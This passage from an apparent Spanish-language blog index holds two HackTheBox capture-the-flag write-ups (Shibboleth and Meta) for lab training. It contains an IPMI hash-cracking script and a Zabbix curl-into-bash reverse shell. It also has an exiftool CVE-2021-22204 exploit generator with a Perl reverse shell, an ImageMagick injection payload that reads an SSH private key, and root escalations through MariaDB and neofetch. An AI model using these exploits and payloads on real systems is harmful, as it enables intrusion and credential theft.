sistema sabbix como administrador, logramos por medio de un item crear una key para aplicar Remote Code Execution (RCE) y obtener un shell. Para la escalada encontramos credenciales de base de datos en un archivo de configuración de sabbix, luego gracias a poseer una versión desactualizada del Relational database management system (RDBMS) MariaDB podemos crear un payload con msfvenom para asignarla a una variable vulnerable del gestor de base de datos que se ejecuta como root (CVE-2021-27928) y así obtener la shell privilegiada. OS IP Release Date Difficulty Points Linux 10.10.11.124 13 Nov 2021 Medium 30 Antes de empezar la máquina verificamos si tenemos conexión con ella, para ello usamos el comando ping: Explicación de parámetros: -c &amp;lt;count&amp;gt; : Número de paquetes ICMP que deseamos enviar a la máquina Sistema Operativo por aprox. del TTL (Time To Live) : 64 -&amp;gt; Linux | 128 -&amp;gt; WindowsEnumerationEmpezamos escanenado puertos TCP abiertos con la herramienta nmap: Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 --open : Escanear solo puertos abiertos -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -v : Imprimir información del proceso del escaneo -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS) -oG &amp;lt;file&amp;gt; : Guardar output en un archivo (&amp;lt;file&amp;gt;) de formato grepableObservamos que la máquina solo tiene el puerto 80 (http) abierto, así que procedemos a escanearlo a profundidad: Explicación de parámetros : -p&amp;lt;port_1,port_2,...&amp;gt; : Indicamos que puertos queremos escanear -sC : Ejecutar en los puertos scripts por defecto de nmap -sV : Activar detección de versiones de los servicios que corren por los puertos -oN &amp;lt;file&amp;gt; : Guardar el output del escaneo en un archivo con formato NmapNo disponemos de mucha información, pero como es un servicio http procedemos a ejecutar whatweb para ver un poco mas de información y en pararelo abrirla en el navegador:Obervamos un código de estado HTTP 302 Moved Temporally que realiza lo siguiente:En nuestro caso la locación de /temp-doc es shibboleth.htb:Teniendo en cuenta el dominio encontrado (Virtual Hosting), procedemos a agregarlo nuestro archivo /etc/hosts: echo &quot;10.10.11.124 shibboleth.htb&quot; &amp;gt;&amp;gt; /etc/hostsAhora podemos utilizar un script de nmap --script http-enum para buscar directorios básicos antes de tirar con gobuster dir. Pero desde ya te digo que no encontraremos nada interesante y que sea de ayuda.Por ello, empezamos con un escaneo de subdominios con gobuster vhost: Explicación de parámetros : -u &amp;lt;url&amp;gt; : Especificar objetivo URL -w &amp;lt;wordlist&amp;gt; : Especificar &amp;lt;wordlist&amp;gt; para el escaneo de subdominios -r : Aplicar redireccionamiento (302_code)Aplicando lo mismo de antes con estos subdominios : echo &quot;10.10.11.124 monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htb&quot; &amp;gt;&amp;gt; /etc/hostsTambién nos podemos dar cuenta que los 3 tienen el mismo tamaño, lo cúal conlleva a que pueden ser lo mismo, y sí, estamos en lo correcto:Primero debemos saber que es Zabbix, y al buscar encontramos que es un Sistema de Monitorización de Redes creado por Alexei VladishevToqueteando el panel de logeo, nos damos cuenta que hay una referencia a la documentación de Zabbix 5.0, y al entrar observamos que no es la versión actual Zabbix 6.0. Entonces es probable que existan vulnerabilidades, pero después de buscar un buen tiempo no encontramos nada que nos sirvaEn esta situación procedemos a buscar puertos abiertos por el protocolo UDP: Explicación de parámetros : --open : Escanear solo puertos abiertos -sU : Escaneo por el protocolo UDP --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -n : No aplicar descubrimiento de hostsEncontramos el puerto 623 (asf-rmcp) y buscando en internet encontramos que es un Protocolo de gestión remota. Además existe el servicio Intelligent Platform Management Interface (IPMI) que tiene varios vectores de ataquePara comprobar si es vulnerable podemos usar metasploit o un script de nmap ipmi-cipher-zero, puede encontrar mas información el la biblia de los hackers: HacktricksEn mi caso usaré el script de nmap: Explicacíon de parámetros : -sU : Escaneo por el protocolo UDP --script &amp;lt;script_name&amp;gt; : Aplicar un script en específico de nmap -p &amp;lt;port&amp;gt; : Expecificar puerto a escanearFootholdObservamos que es vulnerable el servicio Intelligent Platform Management Interface IPMI 2.0 y para ello existe una vulnerabilidad que nos permite autenticarnos con cualquier usuario y extraer contraseñas hash de usuarios (CVE-2013-4786)Para ello podemos usar metasploit pero a manera de prácticar hice un script en python con algunas referencias para conseguir un usuario existente, extraer su token y crackearlo con john:#!/usr/bin/python3import signal, sys, os, time, nmap, pdb, shlex, subprocess, refrom colorama import Fore, init# reset to dafault colorinit(autoreset=True)# colorsred, yellow, magenta, green = Fore.RED, Fore.YELLOW, Fore.MAGENTA, Fore.GREEN # helpdef help_panel(): print(f&quot;\\n{magenta}[*] Use : {yellow}{sys.argv[0]} &amp;lt;target&amp;gt; &amp;lt;password_wordlist&amp;gt;&quot;) sys.exit()if len(sys.argv) != 3: help_panel() def signal_handler(signum, frame): print(&quot;\\nSignum : {} , Frame : {}&quot;.format(signum, frame)) print(&quot;\\n{red}[!] Exiting...&quot;) exit(1)#ctrl + csignal.signal(signal.SIGINT, signal_handler)# check connectiondef checkConnection(target, port): print(f&quot;\\n{yellow}[+] Checking if port {magenta}{port} {yellow}is open...&quot;) time.sleep(2) scanning = nmap.PortScanner() result = scanning.scan(target, port, arguments=&#39;-sU&#39;) if result[&#39;scan&#39;] == {} or result[&#39;scan&#39;][target][&#39;udp&#39;][int(port)][&#39;state&#39;] == &#39;closed&#39;: print(f&quot;\\n{red}[-] Port {magenta}{port} {red}is closed!&quot;) sys.exit()# check parametersdef checkParameters(target, port, user, wordlist): print(f&quot;\\n{yellow}[+] Using a list of {magenta}users {yellow}by default...&quot;) time.sleep(1) if wordlist: if not os.path.isfile(wordlist): print(f&quot;\\n{red}[!] The password wordlist {magenta}{wordlist} {red}is invalid ***&quot;) sys.exit()# extract user hashdef getUserHash(target, port, user): i = 0 for u in user: output = subprocess.run(shlex.split(f&quot;ipmitool -I lanplus -H {target} -U {u} -P password -vvv 2&amp;gt;&amp;amp;1&quot;), capture_output=True) stderr, stdout = output.stderr.decode(), output.stdout.decode() if &#39;illegal parameter&#39; in stderr or &#39;unauthorized name&#39; in stderr: print(f&quot;{red}[!] Wrong username {magenta}{u} {red}***&quot;) i+=1 pass else: print(f&quot;\\n{yellow}[+] The username {magenta}{u} {yellow}is {green}valid{yellow}...&quot;) time.sleep(2) break if &#39;insuficient resources for session&#39; in stderr: print(f&quot;\\n{red}[!] Insuficient resources for session! ***&quot;); sys.exit() user = user[i] # extract data to salt data = re.findall(r&quot;rakp2 mac input buffer \\(.*\\)\\s+(?: .*?\\n)+\\&amp;gt;\\&amp;gt; rakp2 mac key&quot;, stderr)[0] data = re.sub(f&quot;rakp2 mac input buffer \\(.*\\)\\n&quot;, &quot;&quot;, data).replace(&quot;\\n&amp;gt;&amp;gt; rakp2 mac key&quot;, &quot;&quot;).replace(&quot;\\n&quot;, &quot;&quot;).split(&quot; &quot;) salt = &#39;&#39;.join(data) # extract hash user_hash = re.findall(r&quot;Key exchange auth code \\[sha1\\] : (.*?)\\n?$&quot;, stdout)[0].replace(&quot;0x&quot;, &quot;&quot;) final_hash = f&quot;$rakp${salt}${user_hash}&quot; print(f&quot;\\n{yellow}[+] The hash for user {magenta}{user}: {green}{final_hash}&quot;) # load hash hash_file = &#39;hash&#39; with open(hash_file, &quot;w&quot;) as f: f.write(f&quot;{target} {user}:{final_hash}&quot;) f.close return hash_file# cracking hash with jhondef cracking(wordlist, hash_file): time.sleep(2) print(f&quot;\\n{yellow}[+] Cracking hash with {magenta}John {yellow}tool...&quot;) time.sleep(2) subprocess.run(shlex.split(f&quot;john --wordlist={wordlist} \\&quot;{hash_file}\\&quot;&quot;))def run(): if os.getuid() != 0: print(&quot;\\n[*]{yellow} You must be {red}root {yellow}to run the script!&quot;) sys.exit() # asign variables target = sys.argv[1] port = 623 user = [&quot;ADMIN&quot;, &quot;admin&quot;, &quot;Administrator&quot;, &quot;root&quot;, &quot;USERID&quot;, &quot;guest&quot;, &quot;Admin&quot;] wordlist = sys.argv[2] checkConnection(target, str(port)) checkParameters(target, port, user, wordlist) if user: hash_file = getUserHash(target, port, user) cracking(wordlist, hash_file)# mainif __name__ == &#39;__main__&#39;: run() No olvide instalar antes los requerimientos para el script :#!/bin/bash# valdiate user to runif [ &quot;$(id -u)&quot; -ne 0 ]; then echo &quot;\\n[*] You must be root to run the script!&quot; exitfi# ctrl + cfunction ctrl_c(){ tput cnorm echo -e &quot;\\n[-] Exiting...&quot; exit}trap ctrl_c SIGINT#requirementstput civisecho -ne &quot;\\n[+] Installing requirements:\\n&quot;apt-get install ipmitool nmap python3-pip -yecho -ne &quot;\\n[+] Installing python3 requirements:\\n&quot;pip install colorama python-nmapecho -ne &quot;\\n\\n[*] All requirements have been installed\\n&quot;; tput cnormPueden encontrar los archivos del script en mi repositorio: https://github.com/E1P0TR0Ahora nos logemos con las credenciales obtenidas y nos encontramos con el panel de administración de Zabbix:Revisando la documentación de la versión encontramos que podemos añadir items al host que estamos monitoreando shibboleth.htb, y buscando para que sirven encontramos algo interesante:Para extraer cierta información se hace uso de una key, la cuál es como un nombre de una función en particular que podemos usar. Al igual que esta hay otras más que vienen pre-definidas en el agente Zabbix: Pre-defined keysBuscamos una que nos ayuder a ejecutar comandos para tener una brecha de una reverse shell y entrar al sistema, al final logramos encontrarla:Ahora que sabemos que podemos ejecutar comandos en el host, procedemos a aplicar la reverse_shell: Reverse shell con curl : Creamos un archivo index.html con una reverse en bash:#!/bin/bash bash -i &amp;gt;&amp;amp; /dev/tcp/{nuestra\\_IP}/{puerto} 0&amp;gt;&amp;amp;1 Con python3 y en el mismo directorio compartimos un servidor http : python3 -m http.server 80 En paralelo con nc nos ponemos en escucha para recibir la shell: nc -lvp {puerto} Nos dirigimos al apartado para agregar un item (Configuration -&amp;gt; Hosts -&amp;gt; items -&amp;gt; Create item) y agregamos un nombre cualquiera y en el apartado del agente seleccionas la key system.run[command, &amp;lt;mode&amp;gt;] pero de la siguiente manera: system.run[curl http://{nuestra_IP} | bash, nowait] Presionamos el botón _Test_, luego _Get value_ y recibiremos la shell como zabbix:Ahora para manejarnos mejor por consola hacemos un tratamiento rápido de la TTY:Buscamos que usuarios existen, intentamos ver la flag pero necesitamos ser el usuario ipmi-svc, probamos reusar las credenciales del login de Zabbix y pa-dentro:Privilege EscalationComo el usuario ipmi-svc intentamos listar binarios con permisos SUID find \\-perm -4000 2&amp;gt;/dev/null y binarios que podamos ejecutar como root sudo -l, pero no encontramos nada interesanteSabemos que tenemos un agente Zabbix, así que intentamos buscar archivos de configuración de podemos leer y conseguimos unas credenciales de una base de datos:También podemos hacer uso de LinPEAS que nos permite encontrar posibles rutas para escalar privilegios: LinPEASIngresamos con las credenciales, intentamos buscar información que nos sirva pero no encontramos nada. Pero al observar la versión del Sistema de gestión de bases de datos relacionales (RDBMS) MariaDB 10.3.25 y buscando en internet que la versión actual es MariaDB 10.7.3 nos da la sensasión que puede ser vulnerable:Buscando en internet encontramos una vulnerabilidad en la cuál la variable wsrep_provider pueden ser modificadas en tiempo de ejecución por el usuario de la base de datos zabbix pero con privilegios de SUPER usuario y con ello facilmente obtener una shell como root (CVE-2021-27928): CVE-2021-27928 1. Creamos un payload malicioso (reverse shell) con msfvenom Explicación de parámetros : -p &amp;lt;payload&amp;gt; : Especificar el payload a crear de acuerdo a tus requerimientos LHOST=&amp;lt;host&amp;gt; : Asignar el host que recibirá la reverse shell LPORT=&amp;lt;port&amp;gt; : Asignar el puero por el cuál recibiremos la reverse shell -f &amp;lt;format&amp;gt; : Formato del output del payload -o &amp;lt;file_name&amp;gt; : Guardar el payload en un archivo 2. Compartimos el payload a la máquina víctima (10.10.11.124) en un directorio con permisos (/tmp) 3. En nuestra máquina nos ponemos en escucha por el puerto especificado en el payload 4. Entramos a la base de datos con el usuario zabbix pero agregamos el parámetro -e para ejecutar comandos, asignar a la variable wsrep_provides nuestro payload malicioso, y ya que lo ejecutamos como SUPER usuario, recibir la shell en nuestra máquina y con ello ser root y pa-dentro: " }, { "title": "Hackthebox Writeup Meta", "url": "/posts/HTBMeta/", "categories": "HTB, Writeups", "tags": "HTB, Linux, Medium, Metadata, exiftool, CVE-2021-22204, pspy, XML Injection, ImageMagick, CVE-2020-29599, neofetch, Python Scripting", "date": "2022-02-11 17:48:47 -0500", "snippet": "En la fase de enumeración encontramos que en el servicio web se aplica Virtual Hosting y buscando subdominios encontramos una página para extraer Metadatos usando la herramienta exiftool. Encontramos una vulnerabilidad para obtener Remote Code Execution (RCE) con la subida de una imagen maliciosa (CVE-2021-22204) y obtener una shell. Ahora listamos procesos de otros usuarios del sistema con la utilidad pspy y encontramos un ataque XML Inyection para una versión de la herrramienta ImageMagick (CVE-2020-29599), permitiendo RCE y obtener una shell como cierto usuario. Para la escalada encontramos el binario neofetch que podemos ejecutar como root y asignando a su archivo de configuración un comando para activar el modo privilegiado bash -p, ejecutar el binario y ser root. OS IP Release Date Difficulty Points Linux 10.10.11.140 22 Jan 2022 Medium 30 Antes de empezar la máquina es importante revisar si tenemos conexión con ella, para ello usamos el comando ping: Explicación de parámetros: -c &amp;lt;count&amp;gt; : Número de paquetes ICMP que deseamos enviar a la máquina Sistema Operativo por aprox. del TTL (Time To Live) : 64 -&amp;gt; Linux | 128 -&amp;gt; WindowsEnumerationComenzamos escaneando los puertos TCP abiertos con la herramienta nmap: Explicación de parámetros : -p- : Escanear todos los puertos, del 1 al 65,535 --open : Escanear solo puertos abiertos -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo --min-rate &amp;lt;number&amp;gt; : Enviar una taza (&amp;lt;number&amp;gt;) de paquetes por segundo como mínimo -v : Imprimir información del proceso del escaneo -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS) -oG &amp;lt;file&amp;gt; : Guardar output en un archivo (&amp;lt;file&amp;gt;) de formato grepableObservamos que la máquina tiene abierto el puerto 22 (ssh) y 80 (http), asi que procedemos a escanear de manera específica cada uno de estos puertos: Explicación de parámetros : -p&amp;lt;port_1,port_2,...&amp;gt; : Indicamos que puertos queremos escanear -sC : Ejecutar en los puertos scripts por defecto de nmap -sV : Activar detección de versiones de los servicios que corren por los puertos -oN &amp;lt;file&amp;gt; : Guardar el output del escaneo en un archivo con formato NmapOmitimos entrar por el puerto 22 ya que no disponemos de credenciales para entrar por SSH.Vemos que hay un servicio http en el puerto 80, así que ejecutamos whatweb para obtener un poco de información del servicio http y en paralelo entramos a la página web de la máquina en el navegador. En ambos casos obtenemos un código de estado HTTP 301 Moved Permanently el cuál impide comunicarnos con el servidor pero existe una redirección de la misma:Encontramos una redirección a http://artcorp.htb, para estas situaciones aplicamos Virtual Hosting agregando el nombre de dominio al directorio /etc/hosts : echo &quot;10.10.11.140 artcorp.htb&quot; &amp;gt;&amp;gt; /etc/hostsUna vez dentro escanemos directorios de la web por fuerza bruta. Para ello utilizamos la herramienta wfuzz, pero no encontramos nada interesante. Con la misma herramienta aplicamos búsqueda de subdominios y encontramos uno: Explicación de parámetros : -c : Output a colores -t &amp;lt;number&amp;gt; : Números de hilos para ejecutar tareas en paralelo --hc=&amp;lt;status_code&amp;gt; : Ocultar respuestas con el código asignado --hh=&amp;lt;character_number&amp;gt; : Ocultar respuestas con la cantidad de caracteres asignados -w &amp;lt;wordlist&amp;gt; : Asignamos el wordlist para la búsqueda -u &amp;lt;url&amp;gt; : Especificamos la url para la solicitud -H &amp;lt;Headers&amp;gt; : Especificamos el header a utilizar, en este caso HOST el cuál representa el nombre de dominio y remplazamos la palabra FUZZ como el campo subdominioCon el nombre de subdominio encontrado dev01.artcorp.htb, al igual que antes lo agregamos a nuestro archivo /etc/hosts: echo &quot;10.10.11.140 dev01.artcorp.htb&quot; &amp;gt;&amp;gt; /etc/hostsUna vez dentro encontramos una ruta con una herramienta para subir un archivo y extraer metadatos, subimos un archivo de prueba .txt para ver el output que genera y nos damos cuenta que solo se permite subir archivos png/jpg. Subimos una imagen, logramos ver los metadatos y por el formato de salida nos damos cuenta que el programa usa la herramienta exiftool.FootholdEncontramos una vulnerabilidad que consiste en subir una imagen maliciosa y obtener ejecución remota de comandos (CVE-2021-22204). Para explotarlo hice un script en Python a mi manera basandome en algunas referencias de otros exploits:#!/usr/bin/python3import sysimport subprocessimport osimport base64import pdbfrom PIL import Imagefrom termcolor import cprint#colorsprintRed = lambda s: cprint(s, &#39;red&#39;, end=&#39; &#39;)printYellow = lambda s: cprint(s, &#39;yellow&#39;, end=&#39; &#39;)printMagenta = lambda s: cprint(s, &#39;magenta&#39;, end=&#39; &#39;)printGreen = lambda s: cprint(s, &#39;green&#39;, end=&#39; &#39;)#panel_helpdef help(): printYellow(&quot;\\n[*] Uso : &quot;) printMagenta(f&quot;python3 {sys.argv[0]} &amp;lt;ip_address&amp;gt; &amp;lt;port&amp;gt;&quot;) exit(1) #valid_inputif len(sys.argv) != 3: help()#check if djvumake and exiftool is installeddef checkTools(): check_djvu = os.popen(&#39;which djvumake&#39;, &#39;r&#39;) check_exif = os.popen(&#39;which exiftool&#39;, &#39;r&#39;) if check_djvu == &quot;&quot;: exit(printGreen(&quot;\\n[!] djvumake not installed. Install by running command : sudo apt install djvulibre-bin&quot;)) elif check_exif == &quot;&quot;: exit(printGreen(&quot;\\n[!] exiftool not installed. Install by running command : sudo apt install exiftool&quot;)) elif check_exif == &quot;&quot; and check_djvu == &quot;&quot;: exit(printGreen(&quot;\\n[!] djvumake and exiftool not installed. Install by running command : sudo apt install djvulibre-bin exiftool&quot;)) else: return#generate imagedef create_image(): img = Image.new(&#39;RGB&#39;, (50, 50), color=&#39;blue&#39;) img.save(&#39;payload.jpg&#39;)#build the payloaddef gen_payload(ip_address, port): payload = b&quot;(metadata \\&quot;\\c${use MIME::Base64;eval(decode_base64(&#39;&quot; payload += base64.b64encode( set_shell(ip_address, port).encode() ) payload += b&quot;&#39;))};\\&quot;)&quot; return payload#Asign Shelldef set_shell(ip_address, port): reverse_shell = f&#39;&#39;&#39;use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#39;tcp&#39;)); if(connect(S,sockaddr_in({port},inet_aton(&#39;{ip_address}&#39;)))) { open(STDIN,&#39;&amp;gt;&amp;amp;S&#39;); open(STDOUT,&#39;&amp;gt;&amp;amp;S&#39;); open(STDERR,&#39;&amp;gt;&amp;amp;S&#39;); exec(&#39;/bin/sh -i&#39;); }; &#39;&#39;&#39; return reverse_shell#create payload_filedef gen_payload_file(payload): payload_file = open(&#39;payload&#39;, &#39;w&#39;) payload_file.write(payload.decode(&#39;utf-8&#39;)) payload_file.close()#create config_filedef gen_config_file(): filename = &quot;configfile&quot; content = &#39;&#39;&#39;%Image::ExifTool::UserDefined = ( # All EXIF tags are added to the Main table, and WriteGroup is used to # specify where the tag is written (default is ExifIFD if not specified): &#39;Image::ExifTool::Exif::Main&#39; =&amp;gt; { # Example 1. EXIF:NewEXIFTag 0xc51b =&amp;gt; { Name =&amp;gt; &#39;HasselbladExif&#39;, Writable =&amp;gt; &#39;string&#39;, WriteGroup =&amp;gt; &#39;IFD0&#39;, }, # add more user-defined EXIF tags here... }, ); 1; #end% &#39;&#39;&#39; with open(filename, &#39;w&#39;) as f: print(content, file=f) #execute malicious imagedef run(): subprocess.run([&#39;bzz&#39;, &#39;payload&#39;, &#39;payload.bzz&#39;]) subprocess.run([&#39;djvumake&#39;, &#39;exploit.djvu&#39;, &#39;INFO=1,1&#39;, &#39;BGjp=/dev/null&#39;, &#39;ANTz=payload.bzz&#39;]) subprocess.run([&#39;exiftool&#39;, &#39;-config&#39;, &#39;configfile&#39;, &#39;-HasselbladExif&amp;lt;=exploit.djvu&#39;, &#39;payload.jpg&#39;])#remove others filesdef remove_files(): subprocess.run([&#39;rm&#39;, &#39;configfile&#39;, &#39;exploit.djvu&#39;, &#39;payload&#39;, &#39;payload.bzz&#39;, &#39;payload.jpg_original&#39;])#mainif __name__ == &#39;__main__&#39;: ip_address = sys.argv[1] port = sys.argv[2] checkTools() create_image() payload = gen_payload(ip_address, port) gen_config_file() gen_payload_file(payload) run() remove_files()#References#---------------------------------------------------------------------------------#https://github.com/convisolabs/CVE-2021-22204-exiftool#https://github.com/LazyTitan33/ExifTool-DjVu-exploit/blob/main/CVE-2021.22204.py#https://github.com/CsEnox/Gitlab-Exiftool-RCE/blob/main/exploit.pyPueden clonar el exploit en mi repositorio: https://github.com/E1P0TR0Una vez descargado le dan permisos de ejecución chmod +x exploit.py, le asignamos nuestra IP y el puerto por el cuál nos pondremos en escucha para recibir la shell: Uso: ./exploit.py &amp;lt;nuestra IP&amp;gt; &amp;lt;puerto de escucha&amp;gt;Ya tendremos la imagen maliciosa payload.jpg, ahora nos pondremos a escucha por el puerto especificado nc -lvp 1234 y nos dirigimos a la web para subir el archivo y entrar como el usuario www_data, como siempre hacemos tratamiento de la tty para tener una consola interactiva: Tratamiento de la tty : script /dev/null -c bash (Ctrl + z) stty raw -echo; fg reset xterm export SHELL=bash export TERM=xtermIntentamos buscar otros usuarios y encontramos a thomas el cuál contiene la flag, pero no tenemos permisos para verla:Usamos la herramienta pspy para obtener información de procesos que ejecutan otros usuarios en el sistema, con esto podemos tener una brecha para acceder al usuario thomas. Pueden descargar la herramienta en el siguiente repositorio: https://github.com/DominicBreukerUna vez descargado lo pasamos a la máquina victima con la herramienta wget y compartiendo un servidor http con python3: En nuestra máquina : Nos dirigimos al directorio en donde tenemos el binario Abrimos un servidor http con python3: python3 -m http.server &amp;lt;port&amp;gt; En la máquina víctima : Nos dirigimos a un directorio para descargar archivos sin problemas (/tmp) Ya comprobado que la máquina tiene wget: wget http://nuestra_IP:&amp;lt;port&amp;gt;/nombre_del_binario Ahora solo queda darle permisos de ejecución al binario, lo compilamos y esperando unos minutos logramos identificar los procesos /usr/local/bin/convert_images.sh y /usr/local/bin/mogrify con UID=1000, el cual pertenece al usuario thomas:Al ver el binario convert_images.sh observamos que se dirige a una determinada carpeta y luego con mogrify convierte a formato .png todos los archivos:Investigando un poco de mogrify nos damos cuenta que es parte de la herramienta ImageMagick, entonces buscamos la version para ver si es vulnerable:Tenemos la versión ImageMagick 7.0.10-36, buscando en internet encontramos una vulnerabilidad (CVE-2020-29599), la cuál nos permite inyectar comandos a través del parámetro -authenticate que es vulnerable al momento de asignar una contraseña a un archivo PDF encriptado.En el siguiente enlace puede ver el artículo donde se analiza a detalle dicha vulnerabilidad: https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.htmlPrimero nos dirigimos a un directorio de prueba /tmp y creamos un archivo de formato .svg poc.svg con el siguiente contenido:&amp;lt;image authenticate=&#39;ff&quot; `echo $(cat /home/thomas/.ssh/id_rsa | base64)&amp;gt; /home/thomas/private_key`;&quot;&#39;&amp;gt; &amp;lt;read filename=&quot;pdf:/etc/passwd&quot;/&amp;gt; &amp;lt;get width=&quot;base-width&quot; height=&quot;base-height&quot; /&amp;gt; &amp;lt;resize geometry=&quot;400x400&quot; /&amp;gt; &amp;lt;write filename=&quot;test.png&quot; /&amp;gt; &amp;lt;svg width=&quot;700&quot; height=&quot;700&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;&amp;gt; &amp;lt;image xlink:href=&quot;msl:poc.svg&quot; height=&quot;100&quot; width=&quot;100&quot;/&amp;gt; &amp;lt;/svg&amp;gt;&amp;lt;/image&amp;gt;Con lo anterior nuestro objetivo es entrar como el usuario thomas, y sabiendo que podemos ejecutar comandos, entonces intentamos visualizar la llave privada de thomas, encodearla con base64 para tener un mejor formato y por último ponerle un nombre private_key y ubicarla en un directorio donde podamos visualizarla /home/thomas/.Ya tenemos el archivo listo, ahora en base al script convert_images.sh lo copiamos a la ruta /var/www/dev01.artcorp.htb/convert_images/, ejecutamos dicho script y en cuestión de algunos segundos nos dirigimos a la carpeta asiganada anteriormente en la cuál encontraremos la llave privada encodeada:Solo queda ordenarla, decodearla, guardarla en nuestro equipo para entrar por SSH como el usuario thomas y ver la flag: En la máquina víctima: Ejecutamos: cat private_key | tr &#39; &#39; &#39;\\n&#39; | base64 -d Copiamos el output En nuestra máquina: Creamos un archivo: touch id_rsa Pegamos el output, guardamos Le damos permisos: chmod 600 id_rsa Explicación parámetros : -i &amp;lt;identify_file&amp;gt; : Especificar la ubicación de la clave privada del cliente que usamos para logearnos al servidor sshPrivilege EscalationEl último paso que nos queda es escalar como usuario root, para ello primero podemos ejecutar ciertas técnicas clásicas como buscar binarios con permisos SUID o listar binarios que podemos ejecutar como usuario root:No encontramos binarios con permisos SUID, pero existe el binario neofetchque podemos ejeutar como root.Averiguando un poco en internet sabemos que neofetch es un script en bash que nos proporciona información de nuestro equipo y sistema por medio de la terminal:Además se menciona que existe una configuración de usuario en cierta ruta:Buscamos ese archivo de configuración:Contenido del archivo de configuración de thomas:Entonces lo que necesitamos ahora es manipular el archivo de configuración del usuario root y con ello obtener una brecha para convertirnos en usuario rootPara esto, si retrocedemos al momento de ejecutar sudo -l para ver los binarios que podemos ejecutar como usuario, notamos una Variable de entorno:Buscando en internet obtenemos el significado:Ahora lo que debemos hacer es asignar a la variable de entorno nuestra ruta de archivo de configuración de neofetch para que a la hora de ejecutarlo como root, forcemos la lectura de nuestro archivo de configuración y podamos ejecutar lo necesario para acceder como root:Por último, agregamos a nuestro archivo de configuración /bin/bash -p, ejecutamos el binario como usuario root y pa-dentro!: Explicación de comandos usados : sed -i : Permite editar archivos en diferentes lugar, en esta ocasión agregando 1i seguido de “/bin/bash -p” para agregarlo al incio del archivo .config y sea lo primero que se ejecute sudo -u &amp;lt;user&amp;gt; : Permite ejecutar comandos como el usuario asignado Por otro lado para /bin/bash: -p : Este parámetro se utiliza para activar el modo privilegiado y mantener el userid del usuario que lanza la bash" } ]
